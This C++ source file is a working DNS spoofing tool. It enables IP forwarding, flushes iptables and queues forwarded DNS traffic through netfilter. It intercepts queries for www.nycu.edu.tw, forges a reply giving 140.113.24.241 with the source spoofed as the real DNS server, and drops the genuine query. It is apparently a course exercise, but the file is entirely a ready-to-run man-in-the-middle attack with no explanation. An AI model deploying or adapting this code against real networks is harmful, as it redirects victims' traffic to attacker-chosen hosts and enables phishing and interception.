#define _LINUX_IN_H
#include <netinet/in.h>
#include <iostream>
#include <linux/netfilter.h>      
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <cstring>
#include <sys/socket.h>
#include <unistd.h>

using namespace std;

#define DNS_PORT 53
#define SPOOFED_IP "140.113.24.241"
#define TARGET_DOMAIN "www.nycu.edu.tw"

struct DNS_HEADER {
    uint16_t id;
    uint16_t flags;
    uint16_t q_count;
    uint16_t ans_count;
    uint16_t auth_count;
    uint16_t add_count;
};


string parse_domain_name(unsigned char* data) {
    string domain;
    while (*data) {
        int len = *data++;
        for (int i = 0; i < len; i++) {
            domain += *data++;
        }
        domain += '.';
    }
    if (!domain.empty()) domain.pop_back();
    return domain;
}

uint16_t checksum(uint16_t* buf, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len) sum += *(uint8_t*)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

uint16_t udp_checksum(struct iphdr* iph, struct udphdr* udph,[[maybe_unused]] unsigned char* payload,[[maybe_unused]] int payload_len) {
    struct pseudo_header {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t udp_len;
    } psh;

    psh.src_addr = iph->saddr;
    psh.dst_addr = iph->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_len = udph->len;

    int psh_len = sizeof(struct pseudo_header);
    int total_len = psh_len + ntohs(udph->len);
    unsigned char* temp_buf = new unsigned char[total_len];
    memcpy(temp_buf, &psh, psh_len);
    memcpy(temp_buf + psh_len, udph, ntohs(udph->len));

    uint16_t csum = checksum((uint16_t*)temp_buf, total_len);
    delete[] temp_buf;
    return csum;
}

void send_spoofed_response(unsigned char* payload, int new_len) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Failed to create raw socket");
        return;
    }
    struct iphdr* iph = (struct iphdr*)payload;
    struct udphdr* udph = (struct udphdr*)(payload + iph->ihl * 4);

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = udph->dest;
    dest.sin_addr.s_addr = iph->daddr;

    iph->check = 0;
    iph->check = checksum((uint16_t*)iph, iph->ihl * 4);

    udph->check = 0;
    int udp_payload_offset = iph->ihl * 4 + sizeof(struct udphdr);
    int udp_payload_len = new_len - udp_payload_offset;
    udph->check = udp_checksum(iph, udph, payload + udp_payload_offset, udp_payload_len);

    if (sendto(sock, payload, new_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        perror("Failed to send spoofed packet");
    }

    close(sock);
}

static int callback(struct nfq_q_handle* qh, [[maybe_unused]] struct nfgenmsg* nfmsg,
                    struct nfq_data* nfa, [[maybe_unused]] void* data) {
    struct nfqnl_msg_packet_hdr* ph = nfq_get_msg_packet_hdr(nfa);
    uint32_t id = ntohl(ph->packet_id);

    unsigned char* payload;
    int len = nfq_get_payload(nfa, &payload);
    if (len < 0) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }

    struct iphdr* iph = (struct iphdr*)payload;
    if (iph->protocol != IPPROTO_UDP) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }

    struct udphdr* udph = (struct udphdr*)(payload + iph->ihl * 4);
    if (ntohs(udph->dest) != DNS_PORT) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
    }

    unsigned char* dns_start = (unsigned char*)(udph + 1);
    DNS_HEADER* dns = (DNS_HEADER*)dns_start;
    unsigned char* qname = dns_start + sizeof(DNS_HEADER);
    std::string domain = parse_domain_name(qname);

    if (domain == TARGET_DOMAIN) {
        std::cout << "Intercepted DNS Query for " << domain << std::endl;

        in_addr_t victim_ip = iph->saddr;
        in_addr_t dns_server_ip = iph->daddr;
        uint16_t victim_port = udph->source;

        iph->saddr = dns_server_ip;
        iph->daddr = victim_ip;

        udph->source = htons(53);
        udph->dest = victim_port;

        dns->flags = htons(0x8180);
        dns->ans_count = htons(1);
        dns->auth_count = htons(0);
        dns->add_count = htons(0);

        unsigned char* answer_start = qname;
        while (*answer_start) answer_start++;
        answer_start += 5;

        unsigned char fake_answer[16] = {
            0xc0, 0x0c,
            0x00, 0x01,
            0x00, 0x01,
            0x00, 0x00, 0x00, 0x05,
            0x00, 0x04
        };
        inet_pton(AF_INET, SPOOFED_IP, fake_answer + 12);

        int new_len = answer_start - payload;
        memcpy(answer_start, fake_answer, sizeof(fake_answer));
        new_len += sizeof(fake_answer);

        iph->tot_len = htons(new_len);
        udph->len = htons(new_len - iph->ihl * 4);

        send_spoofed_response(payload, new_len);

        return nfq_set_verdict(qh, id, NF_DROP, 0, nullptr);
    }

    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
}

int main() {
    system("sysctl -w net.ipv4.ip_forward=1");
    system("iptables --flush");
    system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
    struct nfq_handle* h = nfq_open();
    nfq_unbind_pf(h, AF_INET);
    nfq_bind_pf(h, AF_INET);
    struct nfq_q_handle* qh = nfq_create_queue(h, 0, &callback, nullptr);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    int fd = nfq_fd(h);
    char buf[4096];

    while (true) {
        int n = recv(fd, buf, sizeof(buf), 0);
        if (n >= 0) {
            nfq_handle_packet(h, buf, n);
        } else {
            perror("recv failed");
            break;
        }
    }

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
